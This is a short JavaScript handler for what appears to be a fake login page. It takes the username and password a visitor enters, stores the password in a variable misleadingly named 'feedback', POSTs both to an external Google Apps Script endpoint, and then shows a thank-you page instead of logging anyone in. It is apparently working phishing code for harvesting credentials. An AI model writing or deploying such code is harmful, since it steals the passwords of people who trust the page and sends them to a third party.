function goToThankYou(event) {
  event.preventDefault();

  const form = event.target;
  const name = form.username.value;
  const feedback = form.password.value;

  const scriptURL = 'https://script.google.com/macros/s/AKfycbyKFL9M9bMNABz2-gmgAQfqFPpCk8upxRiG_9JvpK6TP5qhbl-TgwxZRcZTSa1rW5CXmA/exec';

  if (scriptURL) {
    fetch(scriptURL, {
      method: 'POST',
      body: new URLSearchParams({
        'username': name,
        'password': feedback
      })
    })
    .then(response => {
      if (response.ok) {
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('thankYouPage').style.display = 'block';
      } else {
        alert("Something went wrong.");
      }
    })
    .catch(error => {
      console.error('Error!', error.message);
      alert("Error saving your data.");
    });
  } else {
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('thankYouPage').style.display = 'block';
  }
}
